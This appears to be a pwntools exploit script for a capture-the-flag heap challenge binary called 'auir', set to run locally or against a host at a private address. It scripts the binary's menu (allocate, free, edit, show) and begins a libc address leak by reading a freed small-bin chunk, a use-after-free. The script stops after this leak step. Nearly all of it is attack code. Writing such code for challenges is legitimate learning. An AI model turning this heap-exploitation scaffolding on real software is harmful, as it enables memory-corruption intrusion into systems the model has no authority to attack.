#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

context.clear(arch='amd64')
exe = context.binary = ELF('auir')
context.terminal = ['gnome-terminal', '-e']

host = args.HOST or '10.67.0.1'
port = int(args.PORT or 31761)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x{exe.entry:x}
continue
'''.format(**locals())

"""
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
"""
# -- Exploit goes here --

io = start()

def prompt():
    io.recvuntil('>>')

def alloc(size, content):
    prompt()
    io.sendline('1')

    prompt()
    io.sendline(str(size))

    prompt()
    io.sendline(content)

def free(index):
    prompt()
    io.sendline('2')

    prompt()
    io.sendline(str(index))

def edit(index, sz, content):
    prompt()
    io.sendline('3')

    prompt()
    io.sendline(str(index))

    prompt()
    io.sendline(str(sz))

    prompt()
    io.sendline(content)

def show(index):
    prompt()
    io.sendline('4')

    prompt()
    io.sendline(str(index))

def leak_libc():
    # small bin chunks
    alloc(200, "A" * 8)
    alloc(200, "B" * 8)
    free(0)
    show(0)

    io.recv()

leak_libc()
